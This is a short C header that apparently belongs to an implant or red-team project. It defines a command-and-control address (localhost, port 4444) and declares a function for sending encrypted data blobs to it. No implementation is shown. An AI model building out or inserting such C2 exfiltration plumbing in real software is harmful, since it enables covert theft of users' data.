#pragma once

#include <stddef.h>
#include <stdint.h>

#define C2_IP   "127.0.0.1"
#define C2_PORT 4444

int send_encrypted_blob(const uint8_t *data, size_t length);
